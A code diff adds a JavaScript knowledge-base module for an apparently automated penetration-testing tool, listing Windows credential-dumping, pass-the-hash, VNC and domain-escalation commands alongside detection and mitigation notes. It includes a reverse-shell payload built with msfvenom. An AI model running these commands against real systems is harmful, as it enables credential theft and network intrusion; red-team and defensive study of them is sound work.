@@ -1,0 +1,1008 @@
+import {
+  __esm
+} from "./chunk-KFQGP6VL.js";
+
+// server/lib/knowledge/post-exploit-credential-knowledge.ts
+function buildCredentialDumpContext(params) {
+  const sections = [];
+  const platform = params?.targetPlatform ?? "windows";
+  const privLevel = params?.privilegeLevel ?? "user";
+  const hasAD = params?.hasActiveDirectory ?? true;
+  sections.push("## Credential Dumping Knowledge Base");
+  sections.push("Source: Hacking Articles \u2014 structured post-exploitation credential harvesting techniques.\n");
+  let techniques = CREDENTIAL_DUMP_TECHNIQUES.filter(
+    (t) => t.targetPlatform === platform || t.targetPlatform === "both"
+  );
+  const privOrder = { user: 0, admin: 1, system: 2 };
+  techniques = techniques.filter((t) => privOrder[t.requiredPrivilege] <= privOrder[privLevel]);
+  if (!hasAD) {
+    techniques = techniques.filter((t) => !["dcsync", "ntds_dit", "domain_cache"].includes(t.category));
+  }
+  for (const tech of techniques) {
+    sections.push(`### ${tech.name} [${tech.mitreTechniqueIds.join(", ")}]`);
+    sections.push(tech.description);
+    sections.push(`**Required Privilege:** ${tech.requiredPrivilege}`);
+    sections.push(`**Tools:**`);
+    for (const tool of tech.tools.slice(0, 4)) {
+      sections.push(`- \`${tool.tool}\`: \`${tool.command}\` \u2014 ${tool.description}`);
+    }
+    sections.push(`**Detection:** ${tech.detectionIndicators.slice(0, 2).join("; ")}`);
+    sections.push(`**Mitigation:** ${tech.mitigations.slice(0, 2).join("; ")}`);
+    sections.push("");
+  }
+  return sections.join("\n");
+}
+function buildLateralMoveContext(params) {
+  const sections = [];
+  const credType = params?.availableCredentialType ?? "ntlm_hash";
+  sections.push("## Lateral Movement Knowledge Base");
+  sections.push("Source: Hacking Articles \u2014 Pass the Hash and service exploitation techniques.\n");
+  let techniques = LATERAL_MOVE_TECHNIQUES.filter(
+    (t) => t.requiredCredentialType === credType || credType === "password"
+  );
+  if (params?.targetProtocols?.length) {
+    techniques = techniques.filter((t) => params.targetProtocols.includes(t.protocol));
+  }
+  for (const tech of techniques) {
+    sections.push(`### ${tech.name} [${tech.mitreTechniqueIds.join(", ")}] \u2014 Ports: ${tech.ports.join(", ")}`);
+    sections.push(tech.description);
+    sections.push(`**Tools:**`);
+    for (const tool of tech.tools.slice(0, 3)) {
+      sections.push(`- \`${tool.tool}\`: \`${tool.command}\``);
+    }
+    sections.push(`**Detection:** ${tech.detectionIndicators.slice(0, 2).join("; ")}`);
+    sections.push(`**Mitigation:** ${tech.mitigations.slice(0, 2).join("; ")}`);
+    sections.push("");
+  }
+  return sections.join("\n");
+}
+function buildDomainEscalationContext() {
+  const sections = [];
+  sections.push("## Domain Escalation Knowledge Base");
+  sections.push("Source: Hacking Articles \u2014 Active Directory privilege escalation techniques.\n");
+  for (const tech of DOMAIN_ESCALATION_TECHNIQUES) {
+    sections.push(`### ${tech.name} [${tech.mitreTechniqueIds.join(", ")}]`);
+    sections.push(tech.description);
+    sections.push(`**Prerequisites:** ${tech.prerequisites.join("; ")}`);
+    sections.push(`**Attack Steps:**`);
+    for (const step of tech.attackSteps) {
+      sections.push(`${step.order}. **${step.action}** (${step.tool}): ${step.description}`);
+      sections.push(`   \`${step.command}\``);
+    }
+    sections.push(`**Detection:** ${tech.detectionIndicators.slice(0, 3).join("; ")}`);
+    sections.push(`**Mitigation:** ${tech.mitigations.slice(0, 3).join("; ")}`);
+    sections.push("");
+  }
+  return sections.join("\n");
+}
+function buildServiceExploitContext(targetService) {
+  const sections = [];
+  sections.push("## Service Exploitation Knowledge Base");
+  sections.push("Source: Hacking Articles \u2014 service-specific exploitation techniques.\n");
+  let techniques = SERVICE_EXPLOIT_TECHNIQUES;
+  if (targetService) {
+    techniques = techniques.filter(
+      (t) => t.service.toLowerCase().includes(targetService.toLowerCase())
+    );
+  }
+  for (const tech of techniques) {
+    sections.push(`### ${tech.name} \u2014 ${tech.service} (Ports: ${tech.ports.join(", ")})`);
+    sections.push(`[${tech.mitreTechniqueIds.join(", ")}]`);
+    sections.push(tech.description);
+    sections.push(`**Tools:**`);
+    for (const tool of tech.tools) {
+      sections.push(`- \`${tool.tool}\`: \`${tool.command}\` \u2014 ${tool.description}`);
+    }
+    sections.push(`**Detection:** ${tech.detectionIndicators.join("; ")}`);
+    sections.push(`**Mitigation:** ${tech.mitigations.join("; ")}`);
+    sections.push("");
+  }
+  return sections.join("\n");
+}
+function buildFullPostExploitKnowledgeContext(params) {
+  return [
+    buildCredentialDumpContext({
+      targetPlatform: params?.targetPlatform,
+      privilegeLevel: params?.privilegeLevel,
+      hasActiveDirectory: params?.hasActiveDirectory
+    }),
+    buildLateralMoveContext({
+      availableCredentialType: params?.availableCredentialType
+    }),
+    buildDomainEscalationContext(),
+    buildServiceExploitContext()
+  ].join("\n\n---\n\n");
+}
+var CREDENTIAL_DUMP_TECHNIQUES, LATERAL_MOVE_TECHNIQUES, DOMAIN_ESCALATION_TECHNIQUES, SERVICE_EXPLOIT_TECHNIQUES;
+var init_post_exploit_credential_knowledge = __esm({
+  "server/lib/knowledge/post-exploit-credential-knowledge.ts"() {
+    "use strict";
+    CREDENTIAL_DUMP_TECHNIQUES = [
+      {
+        id: "CRED-DUMP-001",
+        name: "Domain Cached Credentials (DCC/MSCASH)",
+        category: "domain_cache",
+        description: "Windows caches domain credentials locally (MSCACHEV2 format) to allow offline authentication. Attackers with SYSTEM access can extract these hashes from the SECURITY registry hive and crack them offline. By default, Windows caches the last 10 domain logon credentials.",
+        mitreTechniqueIds: ["T1003.005"],
+        requiredPrivilege: "system",
+        targetPlatform: "windows",
+        tools: [
+          {
+            tool: "Metasploit",
+            command: "use post/windows/gather/cachedump; set SESSION <id>; exploit",
+            description: "Extract cached domain credentials via Meterpreter session",
+            requiresAdmin: true
+          },
+          {
+            tool: "Impacket",
+            command: "python secretsdump.py -security security_hive -system system_hive LOCAL",
+            description: "Offline extraction from exported SECURITY and SYSTEM registry hives",
+            requiresAdmin: false
+          },
+          {
+            tool: "Mimikatz",
+            command: "privilege::debug; token::elevate; lsadump::cache",
+            description: "Extract cached credentials from memory with elevated privileges",
+            requiresAdmin: true
+          },
+          {
+            tool: "PowerShell Empire",
+            command: "usemodule credentials/mimikatz/cache; set Agent <id>; execute",
+            description: "Extract cached credentials via Empire agent",
+            requiresAdmin: true
+          },
+          {
+            tool: "Koadic",
+            command: "use mimikatz_dotnet2js; set MIMICMD lsadump::cache",
+            description: "Extract cached credentials via Koadic implant",
+            requiresAdmin: true
+          },
+          {
+            tool: "mscache.py",
+            command: "python mscache.py --security /path/security --system /path/system",
+            description: "Standalone offline DCC hash extractor",
+            requiresAdmin: false
+          },
+          {
+            tool: "John the Ripper",
+            command: "john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
+            description: "Crack extracted MSCACHEV2 hashes offline",
+            requiresAdmin: false
+          }
+        ],
+        prerequisites: [
+          "SYSTEM-level access on target machine",
+          "Target must have previously authenticated domain users",
+          "Registry hive access (HKLM\\SECURITY, HKLM\\SYSTEM)"
+        ],
+        artifacts: [
+          "SECURITY registry hive",
+          "SYSTEM registry hive",
+          "MSCACHEV2 hash format: $DCC2$<iterations>#<username>#<hash>"
+        ],
+        detectionIndicators: [
+          "reg.exe save commands targeting HKLM\\SECURITY or HKLM\\SYSTEM",
+          "Process access to LSASS with suspicious parent processes",
+          "Mimikatz-related strings in memory or on disk",
+          "Event ID 4688 \u2014 Process creation for reg.exe with sensitive hive paths"
+        ],
+        mitigations: [
+          "Reduce CachedLogonsCount via GPO (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon)",
+          "Enable Credential Guard on Windows 10/11 and Server 2016+",
+          "Monitor for registry hive export commands",
+          "Restrict local admin access to workstations"
+        ]
+      },
+      {
+        id: "CRED-DUMP-002",
+        name: "DCSync Attack",
+        category: "dcsync",
+        description: "DCSync abuses the Active Directory replication protocol (MS-DRSR) to impersonate a Domain Controller and request password hash replication. Requires Replicating Directory Changes and Replicating Directory Changes All privileges. Can dump any account including krbtgt for Golden Ticket attacks.",
+        mitreTechniqueIds: ["T1003.006"],
+        requiredPrivilege: "user",
+        targetPlatform: "windows",
+        tools: [
+          {
+            tool: "Impacket secretsdump",
+            command: "impacket-secretsdump 'domain/user:password'@dc_ip",
+            description: "Dump all domain hashes via DCSync replication",
+            requiresAdmin: false
+          },
+          {
+            tool: "Mimikatz",
+            command: "lsadump::dcsync /domain:domain.local /user:krbtgt",
+            description: "DCSync specific user (krbtgt for Golden Ticket)",
+            requiresAdmin: false
+          },
+          {
+            tool: "CrackMapExec",
+            command: "nxc smb dc_ip -u user -p password --ntds",
+            description: "Dump NTDS via DCSync using CrackMapExec",
+            requiresAdmin: false
+          },
+          {
+            tool: "bloodyAD",
+            command: "bloodyAD --host dc_ip -d domain.local -u admin -p password add dcsync target_user",
+            description: "Grant DCSync rights to a user via bloodyAD",
+            requiresAdmin: false
+          },
+          {
+            tool: "Impacket dacledit",
+            command: "impacket-dacledit domain/admin:'password' -action write -rights DCSync -principal target_user -target-dn 'DC=domain,DC=local' -dc-ip dc_ip",
+            description: "Add DCSync ACL rights to a user",
+            requiresAdmin: false
+          },
+          {
+            tool: "certipy-ad + passthecert",
+            command: "certipy-ad cert -pfx admin.pfx -nokey -out user.crt; certipy-ad cert -pfx admin.pfx -nocert -out user.key; ./passthecert.py -action modify_user -crt user.crt -key user.key -domain domain.local -dc-ip dc_ip -target user -elevate",
+            description: "Use certificate-based auth to grant DCSync via PassTheCert",
+            requiresAdmin: false
+          },
+          {
+            tool: "BloodHound",
+            command: "bloodhound-python -u user -p password -ns dc_ip -d domain.local -c All",
+            description: "Map AD attack paths including DCSync-capable principals",
+            requiresAdmin: false
+          },
+          {
+            tool: "Metasploit",
+            command: "use auxiliary/scanner/smb/impacket/secretsdump; set RHOSTS dc_ip; set SMBUSER user; set SMBPASS password; run",
+            description: "DCSync via Metasploit's Impacket integration",
+            requiresAdmin: false
+          }
+        ],
+        prerequisites: [
+          "Account with Replicating Directory Changes + Replicating Directory Changes All ACLs",
+          "Network access to Domain Controller (TCP 135, 389, 445)",
+          "Or: ability to grant these ACLs via WriteDACL/GenericAll on domain object"
+        ],
+        artifacts: [
+          "NTLM hashes for all domain accounts",
+          "krbtgt hash (enables Golden Ticket)",
+          "Kerberos AES keys"
+        ],
+        detectionIndicators: [
+          "Event ID 4662 \u2014 DS-Replication-Get-Changes and DS-Replication-Get-Changes-All from non-DC",
+          "Unusual replication traffic from non-DC IP addresses",
+          "New ACEs granting replication rights on domain object",
+          "BloodHound collection activity (LDAP enumeration patterns)"
+        ],
+        mitigations: [
+          "Restrict Replicating Directory Changes ACLs to only Domain Controllers",
+          "Monitor Event ID 4662 for replication access from non-DC accounts",
+          "Implement tiered administration model",
+          "Regular audit of domain object ACLs",
+          "Deploy Microsoft ATA/Defender for Identity for DCSync detection"
+        ]
+      },
+      {
+        id: "CRED-DUMP-003",
+        name: "NTDS.dit Extraction",
+        category: "ntds_dit",
+        description: "NTDS.dit is the Active Directory database file containing all domain user password hashes. Attackers with Domain Admin access can extract it using Volume Shadow Copy, ntdsutil, or remote tools like secretsdump. Contains NTLM hashes, Kerberos keys, and password history.",
+        mitreTechniqueIds: ["T1003.003"],
+        requiredPrivilege: "admin",
+        targetPlatform: "windows",
+        tools: [
+          {
+            tool: "ntdsutil.exe",
+            command: 'ntdsutil.exe "activate instance ntds" "ifm" "create full c:\\ntds_dump" quit quit',
+            description: "Create Install From Media backup containing NTDS.dit and SYSTEM hive",
+            requiresAdmin: true
+          },
+          {
+            tool: "Volume Shadow Copy",
+            command: "vssadmin create shadow /for=C:; copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit c:\\temp\\ntds.dit",
+            description: "Create VSS snapshot and extract NTDS.dit from shadow copy",
+            requiresAdmin: true
+          },
+          {
+            tool: "Impacket secretsdump",
+            command: "impacket-secretsdump -ntds ntds.dit -system system.save LOCAL",
+            description: "Offline extraction of hashes from NTDS.dit + SYSTEM hive",
+            requiresAdmin: false
+          },
+          {
+            tool: "Mimikatz",
+            command: "lsadump::dcsync /domain:domain.local /all /csv",
+            description: "Dump all domain hashes via DCSync (alternative to NTDS.dit extraction)",
+            requiresAdmin: false
+          },
+          {
+            tool: "reg.exe",
+            command: "reg save hklm\\system c:\\temp\\system.save",
+            description: "Export SYSTEM registry hive (needed to decrypt NTDS.dit)",
+            requiresAdmin: true
+          }
+        ],
+        prerequisites: [
+          "Domain Admin or equivalent privileges on Domain Controller",
+          "Access to Domain Controller file system or remote admin shares",
+          "SYSTEM registry hive for decryption key"
+        ],
+        artifacts: [
+          "NTDS.dit database file",
+          "SYSTEM registry hive (contains boot key for decryption)",
+          "All domain NTLM hashes and Kerberos keys",
+          "Password history (if enabled)"
+        ],
+        detectionIndicators: [
+          "ntdsutil.exe execution on Domain Controllers",
+          "vssadmin.exe shadow copy creation",
+          "Large file transfers from Domain Controllers",
+          "Event ID 4688 \u2014 ntdsutil.exe or vssadmin.exe process creation",
+          "Event ID 8222 \u2014 Shadow copy creation"
+        ],
+        mitigations: [
+          "Monitor and alert on ntdsutil.exe and vssadmin.exe execution on DCs",
+          "Restrict Domain Admin account usage",
+          "Implement Privileged Access Workstations (PAWs)",
+          "Enable Credential Guard on DCs where supported",
+          "Regular password rotation for service accounts"
+        ]
+      },
+      {
+        id: "CRED-DUMP-004",
+        name: "Application Credential Dumping",
+        category: "applications",
+        description: "Post-exploitation technique to extract stored credentials from applications including FTP clients, remote connection managers, web browsers, and other software that stores passwords locally. Tools like LaZagne automate extraction across dozens of applications.",
+        mitreTechniqueIds: ["T1555", "T1555.003"],
+        requiredPrivilege: "user",
+        targetPlatform: "windows",
+        tools: [
+          {
+            tool: "LaZagne",
+            command: "LaZagne.exe all",
+            description: "Extract credentials from all supported applications (browsers, FTP, mail, databases, etc.)",
+            requiresAdmin: false
+          },
+          {
+            tool: "Mimikatz",
+            command: "sekurlsa::logonpasswords",
+            description: "Dump plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS",
+            requiresAdmin: true
+          },
+          {
+            tool: "FileZilla extraction",
+            command: "type %APPDATA%\\FileZilla\\recentservers.xml",
+            description: "Extract stored FTP credentials from FileZilla config (base64 encoded)",
+            requiresAdmin: false
+          },
+          {
+            tool: "mRemoteNG extraction",
+            command: "type %APPDATA%\\mRemoteNG\\confCons.xml",
+            description: "Extract stored remote connection credentials from mRemoteNG",
+            requiresAdmin: false
+          }
+        ],
+        prerequisites: [
+          "Shell access on target machine",
+          "Target applications with stored credentials",
+          "For LSASS: SYSTEM/admin privileges"
+        ],
+        artifacts: [
+          "Plaintext passwords from applications",
+          "Base64-encoded FTP credentials",
+          "Encrypted connection manager passwords",
+          "Browser saved passwords and cookies"
+        ],
+        detectionIndicators: [
+          "LaZagne.exe or similar credential harvesting tools on disk",
+          "Access to application credential storage files",
+          "Unusual process accessing browser profile directories",
+          "LSASS memory access from non-system processes"
+        ],
+        mitigations: [
+          "Use enterprise password managers instead of application-stored credentials",
+          "Enable master passwords in applications that support them",
+          "Deploy application whitelisting to block credential harvesting tools",
+          "Monitor for access to known credential storage locations"
+        ]
+      },
+      {
+        id: "CRED-DUMP-005",
+        name: "Windows Credential Manager Dumping",
+        category: "credential_manager",
+        description: "Windows Credential Manager (Windows Vault) stores web and Windows credentials. Attackers can extract these using built-in utilities (VaultCmd, cmdkey), Mimikatz, LaZagne, or PowerShell scripts. Includes saved RDP, SMB, and web credentials.",
+        mitreTechniqueIds: ["T1555.004"],
+        requiredPrivilege: "user",
+        targetPlatform: "windows",
+        tools: [
+          {
+            tool: "cmdkey",
+            command: "cmdkey /list",
+            description: "List all stored Windows credentials (built-in, no tools needed)",
+            requiresAdmin: false
+          },
+          {
+            tool: "VaultCmd",
+            command: 'VaultCmd /listcreds:"Windows Credentials" /all',
+            description: "List Windows Vault credentials using built-in utility",
+            requiresAdmin: false
+          },
+          {
+            tool: "Mimikatz",
+            command: "vault::cred; vault::list",
+            description: "Extract credentials from Windows Vault via Mimikatz",
+            requiresAdmin: true
+          },
+          {
+            tool: "LaZagne",
+            command: "lazagne.exe all",
+            description: "Extract credentials from Credential Manager and other sources",
+            requiresAdmin: false
+          },
+          {
+            tool: "PowerShell",
+            command: "powershell_import Get-WebCredentials.ps1; powershell_execute Get-WebCredentials",
+            description: "Extract web credentials from Credential Manager via PowerShell",
+            requiresAdmin: false
+          }
+        ],
+        prerequisites: [
+          "Shell access as the target user",
+          "Target user has saved credentials in Credential Manager"
+        ],
+        artifacts: [
+          "Saved Windows credentials (RDP, SMB targets)",
+          "Saved web credentials (browser-stored via Credential Manager)",
+          "Generic credentials stored by applications"
+        ],
+        detectionIndicators: [
+          "cmdkey.exe or VaultCmd.exe execution",
+          "Mimikatz vault commands in memory",
+          "PowerShell scripts accessing Credential Manager APIs",
+          "Event ID 4688 \u2014 credential utility process creation"
+        ],
+        mitigations: [
+          "Educate users not to save credentials in Credential Manager",
+          "Use enterprise SSO instead of saved credentials",
+          "Monitor for credential utility execution",
+          "Enable Credential Guard to protect LSASS"
+        ]
+      },
+      {
+        id: "CRED-DUMP-006",
+        name: "Clipboard Credential Harvesting",
+        category: "clipboard",
+        description: "Attackers monitor or dump the Windows clipboard to capture credentials that users copy-paste. PowerShell provides native clipboard access. Can also be used to inject malicious content into the clipboard for social engineering (clipboard hijacking).",
+        mitreTechniqueIds: ["T1115"],
+        requiredPrivilege: "user",
+        targetPlatform: "windows",
+        tools: [
+          {
+            tool: "PowerShell",
+            command: "Get-Clipboard -Raw",
+            description: "Read current clipboard contents (may contain copied passwords)",
+            requiresAdmin: false
+          },
+          {
+            tool: "PowerShell (inject)",
+            command: "Set-Clipboard -Value 'malicious_content'",
+            description: "Replace clipboard content with attacker-controlled data",
+            requiresAdmin: false
+          },
+          {
+            tool: "Meterpreter",
+            command: "use post/windows/gather/clipboard; set SESSION <id>; run",
+            description: "Continuously monitor clipboard for sensitive data",
+            requiresAdmin: false
+          }
+        ],
+        prerequisites: [
+          "Shell access on target machine",
+          "User actively copying sensitive data"
+        ],
+        artifacts: [
+          "Copied passwords, tokens, API keys",
+          "Clipboard history (if Windows Clipboard History enabled)"
+        ],
+        detectionIndicators: [
+          "PowerShell Get-Clipboard commands in logs",
+          "Continuous clipboard monitoring processes",
+          "Unusual clipboard API access patterns"
+        ],
+        mitigations: [
+          "Disable Windows Clipboard History via GPO",
+          "Use password managers with auto-type instead of copy-paste",
+          "Monitor for clipboard access from suspicious processes",
+          "Educate users about clipboard hijacking risks"
+        ]
+      }
+    ];
+    LATERAL_MOVE_TECHNIQUES = [
+      {
+        id: "LAT-MOVE-001",
+        name: "Pass the Hash \u2014 SMB",
+        protocol: "smb",
+        description: "Use NTLM hash to authenticate to remote SMB services without knowing the plaintext password. Enables remote command execution via PsExec, remote share access, and service creation.",
+        mitreTechniqueIds: ["T1550.002"],
+        requiredCredentialType: "ntlm_hash",
+        tools: [
+          {
+            tool: "CrackMapExec",
+            command: "nxc smb target_ip -u administrator -H <ntlm_hash> -x ipconfig",
+            description: "Execute commands via SMB using NTLM hash",
+            requiresAdmin: false
+          },
+          {
+            tool: "Impacket psexec",
+            command: "impacket-psexec domain/administrator@target_ip -hashes :<ntlm_hash>",
+            description: "Get interactive SYSTEM shell via SMB service creation",
+            requiresAdmin: false
+          },
+          {
+            tool: "Impacket secretsdump",
+            command: "impacket-secretsdump domain/user@target_ip -hashes :<ntlm_hash>",
+            description: "Dump SAM/LSA secrets from remote host via PtH",
+            requiresAdmin: false
+          },
+          {
+            tool: "Metasploit psexec",
+            command: "use exploit/windows/smb/psexec; set RHOSTS target_ip; set SMBUSER administrator; set SMBPASS 00000000000000000000000000000000:<ntlm_hash>; run",
+            description: "Metasploit PsExec module with hash authentication",
+            requiresAdmin: false
+          },
+          {
+            tool: "pth-winexe",
+            command: "pth-winexe -U Administrator%00000000000000000000000000000000:<ntlm_hash> //target_ip cmd.exe",
+            description: "Get remote shell via Pass the Hash",
+            requiresAdmin: false
+          }
+        ],
+        ports: [445, 139],
+        detectionIndicators: [
+          "Event ID 4624 \u2014 Logon Type 3 with NTLM authentication from unusual source",
+          "Event ID 7045 \u2014 New service creation (PsExec pattern)",
+          "Lateral movement from non-admin workstations",
+          "Multiple failed logons followed by successful NTLM auth"
+        ],
+        mitigations: [
+          "Disable NTLM authentication where possible (enforce Kerberos)",
+          "Enable LSA protection and Credential Guard",
+          "Implement Local Administrator Password Solution (LAPS)",
+          "Network segmentation to limit SMB access",
+          "Monitor for PsExec-like service creation patterns"
+        ]
+      },
+      {
+        id: "LAT-MOVE-002",
+        name: "Pass the Hash \u2014 WMI",
+        protocol: "wmi",
+        description: "Use NTLM hash to authenticate to Windows Management Instrumentation (WMI) for remote command execution. WMI provides stealthier lateral movement than SMB/PsExec as it uses existing Windows infrastructure.",
+        mitreTechniqueIds: ["T1550.002", "T1047"],
+        requiredCredentialType: "ntlm_hash",
+        tools: [
+          {
+            tool: "CrackMapExec",
+            command: "nxc wmi target_ip -u administrator -H <ntlm_hash> -x dir",
+            description: "Execute commands via WMI using NTLM hash",
+            requiresAdmin: false
+          },
+          {
+            tool: "Impacket wmiexec",
+            command: "impacket-wmiexec domain/administrator@target_ip -hashes :<ntlm_hash>",
+            description: "Semi-interactive shell via WMI with hash auth",
+            requiresAdmin: false
+          }
+        ],
+        ports: [135, 445],
+        detectionIndicators: [
+          "Event ID 4624 \u2014 Logon Type 3 with WMI process creation",
+          "WMI activity from unusual source IPs",
+          "wmiprvse.exe spawning cmd.exe or powershell.exe"
+        ],
+        mitigations: [
+          "Restrict WMI access via firewall rules",
+          "Monitor WMI event subscriptions",
+          "Disable remote WMI where not needed",
+          "Implement LAPS for local admin passwords"
+        ]
+      },
+      {
+        id: "LAT-MOVE-003",
+        name: "Pass the Hash \u2014 WinRM",
+        protocol: "winrm",
+        description: "Use NTLM hash to authenticate to Windows Remote Management (WinRM) for PowerShell remoting. Provides full PowerShell session on remote host. Evil-WinRM is the go-to tool for this.",
+        mitreTechniqueIds: ["T1550.002", "T1021.006"],
+        requiredCredentialType: "ntlm_hash",
+        tools: [
+          {
+            tool: "Evil-WinRM",
+            command: "evil-winrm -i target_ip -u administrator -H <ntlm_hash>",
+            description: "Interactive PowerShell session via WinRM with hash auth",
+            requiresAdmin: false
+          },
+          {
+            tool: "CrackMapExec",
+            command: "nxc winrm target_ip -u administrator -H <ntlm_hash> -x ipconfig",
+            description: "Execute commands via WinRM using NTLM hash",
+            requiresAdmin: false
+          },
+          {
+            tool: "Metasploit",
+            command: "use auxiliary/scanner/winrm/winrm_cmd; set RHOSTS target_ip; set USERNAME administrator; set PASSWORD 00000000000000000000000000000000:<ntlm_hash>; run",
+            description: "WinRM command execution via Metasploit",
+            requiresAdmin: false
+          }
+        ],
+        ports: [5985, 5986],
+        detectionIndicators: [
+          "Event ID 4624 \u2014 Logon Type 3 on WinRM ports",
+          "PowerShell remoting from unusual sources",
+          "wsmprovhost.exe process creation"
+        ],
+        mitigations: [
+          "Restrict WinRM access to management networks",
+          "Enable PowerShell logging (ScriptBlock, Module, Transcription)",
+          "Use JEA (Just Enough Administration) to limit WinRM capabilities"
+        ]
+      },
+      {
+        id: "LAT-MOVE-004",
+        name: "Pass the Hash \u2014 RDP",
+        protocol: "rdp",
+        description: "Use NTLM hash to authenticate to Remote Desktop Protocol. Requires Restricted Admin mode to be enabled on the target. Provides full GUI desktop access.",
+        mitreTechniqueIds: ["T1550.002", "T1021.001"],
+        requiredCredentialType: "ntlm_hash",
+        tools: [
+          {
+            tool: "xfreerdp",
+            command: "xfreerdp3 /u:administrator /v:target_ip /cert:ignore /pth:<ntlm_hash> /size:1920x1080",
+            description: "RDP session using Pass the Hash (requires Restricted Admin mode)",
+            requiresAdmin: false
+          }
+        ],
+        ports: [3389],
+        detectionIndicators: [
+          "Event ID 4624 \u2014 Logon Type 10 with Restricted Admin mode",
+          "RDP connections from unusual source IPs",
+          "Restricted Admin mode enabled on target"
+        ],
+        mitigations: [
+          "Disable Restricted Admin mode unless required",
+          "Enable NLA (Network Level Authentication)",
+          "Restrict RDP access via firewall and GPO",
+          "Monitor for unusual RDP source IPs"
+        ]
+      },
+      {
+        id: "LAT-MOVE-005",
+        name: "Pass the Hash \u2014 MSSQL",
+        protocol: "mssql",
+        description: "Use NTLM hash to authenticate to Microsoft SQL Server for database access and command execution. Can chain with xp_cmdshell for OS-level command execution.",
+        mitreTechniqueIds: ["T1550.002", "T1078"],
+        requiredCredentialType: "ntlm_hash",
+        tools: [
+          {
+            tool: "CrackMapExec",
+            command: "nxc mssql target_ip -u administrator -H <ntlm_hash> -x ipconfig",
+            description: "Execute OS commands via MSSQL using PtH + xp_cmdshell",
+            requiresAdmin: false
+          },
+          {
+            tool: "Impacket mssqlclient",
+            command: "impacket-mssqlclient user@target_ip -hashes 00000000000000000000000000000000:<ntlm_hash> -windows-auth",
+            description: "Interactive MSSQL session with hash authentication",
+            requiresAdmin: false
+          }
+        ],
+        ports: [1433],
+        detectionIndicators: [
+          "MSSQL login from unusual source IPs",
+          "xp_cmdshell enablement or execution",
+          "NTLM authentication to MSSQL from non-application accounts"
+        ],
+        mitigations: [
+          "Disable xp_cmdshell on all MSSQL instances",
+          "Use SQL authentication instead of Windows auth where possible",
+          "Restrict MSSQL network access",
+          "Monitor for xp_cmdshell usage"
+        ]
+      },
+      {
+        id: "LAT-MOVE-006",
+        name: "Pass the Hash \u2014 LDAP",
+        protocol: "ldap",
+        description: "Use NTLM hash to authenticate to LDAP for Active Directory enumeration and modification. Enables domain reconnaissance, user enumeration, and potential AD object manipulation.",
+        mitreTechniqueIds: ["T1550.002", "T1087.002"],
+        requiredCredentialType: "ntlm_hash",
+        tools: [
+          {
+            tool: "CrackMapExec",
+            command: "nxc ldap dc_ip -u administrator -H <ntlm_hash> -M whoami",
+            description: "LDAP enumeration via PtH",
+            requiresAdmin: false
+          },
+          {
+            tool: "Metasploit",
+            command: "use auxiliary/gather/ldap_query; set RHOSTS dc_ip; set USERNAME Administrator; set LDAPPassword 00000000000000000000000000000000:<ntlm_hash>; run",
+            description: "LDAP query execution via Metasploit with hash auth",
+            requiresAdmin: false
+          },
+          {
+            tool: "ldeep",
+            command: "ldeep ldap -u Administrator -H :<ntlm_hash> -d domain.local -s ldap dc_ip users",
+            description: "Deep LDAP enumeration with hash authentication",
+            requiresAdmin: false
+          }
+        ],
+        ports: [389, 636],
+        detectionIndicators: [
+          "LDAP bind from unusual source IPs with NTLM auth",
+          "Bulk LDAP queries from non-DC sources",
+          "Event ID 4624 \u2014 Logon Type 3 targeting LDAP services"
+        ],
+        mitigations: [
+          "Enforce LDAP signing and channel binding",
+          "Monitor for unusual LDAP query patterns",
+          "Restrict LDAP access to authorized systems"
+        ]
+      },
+      {
+        id: "LAT-MOVE-007",
+        name: "VNC Exploitation & Lateral Movement",
+        protocol: "vnc",
+        description: "VNC (Virtual Network Computing) provides remote desktop access. Weak or default VNC passwords are common attack vectors. Post-exploitation, VNC can be used for persistence and lateral movement. VNC passwords are stored in a recoverable format using a fixed DES key.",
+        mitreTechniqueIds: ["T1021.005"],
+        requiredCredentialType: "vnc_password",
+        tools: [
+          {
+            tool: "Hydra",
+            command: "hydra -s 5901 -P wordlist.txt -t 16 target_ip vnc",
+            description: "Brute-force VNC password",
+            requiresAdmin: false
+          },
+          {
+            tool: "Nerva",
+            command: "nerva --target target_ip --port 5901",
+            description: "Fingerprint VNC service version and configuration",
+            requiresAdmin: false
+          },
+          {
+            tool: "Metasploit VNC inject",
+            command: "msfvenom -p windows/x64/vncinject/reverse_tcp LHOST=attacker_ip LPORT=5432 -f exe > vnc.exe",
+            description: "Generate VNC inject payload for persistent access",
+            requiresAdmin: false
+          },
+          {
+            tool: "Metasploit VNC capture",
+            command: "use auxiliary/server/capture/vnc; set SRVHOST attacker_ip; set JOHNPWFILE /root/Desktop/; exploit",
+            description: "Capture VNC authentication challenge for offline cracking",
+            requiresAdmin: false
+          },
+          {
+            tool: "vncpasswd.py",
+            command: "python vncpasswd.py -d -H <encrypted_vnc_password_hex>",
+            description: "Decrypt VNC password from encrypted hex (fixed DES key: e84ad660c4721ae0)",
+            requiresAdmin: false
+          },
+          {
+            tool: "OpenSSL VNC decrypt",
+            command: "echo -n <hex_password> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv",
+            description: "Decrypt VNC password using OpenSSL with known DES key",
+            requiresAdmin: false
+          },
+          {
+            tool: "Metasploit cred dump",
+            command: "use post/windows/gather/credentials/vnc; set SESSION 1; exploit",
+            description: "Extract stored VNC credentials from compromised host",
+            requiresAdmin: true
+          }
+        ],
+        ports: [5900, 5901, 5902],
+        detectionIndicators: [
+          "Multiple failed VNC authentication attempts",
+          "VNC connections from unusual source IPs",
+          "VNC service running on non-standard ports",
+          "VNC password file access on compromised hosts"
+        ],
+        mitigations: [
+          "Use strong VNC passwords (8+ characters)",
+          "Restrict VNC access via firewall rules",
+          "Use VNC over SSH tunnel instead of direct exposure",
+          "Replace VNC with more secure alternatives (RDP with NLA, SSH)",
+          "Monitor for VNC brute-force attempts"
+        ]
+      }
+    ];
+    DOMAIN_ESCALATION_TECHNIQUES = [
+      {
+        id: "DOM-ESC-001",
+        name: "Resource-Based Constrained Delegation (RBCD)",
+        description: "RBCD allows an attacker with write access to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute to impersonate any user to that computer. Attack chain: create fake computer account \u2192 set RBCD on target \u2192 request service ticket via S4U2self/S4U2proxy \u2192 access target as admin.",
+        mitreTechniqueIds: ["T1558.003", "T1550.002"],
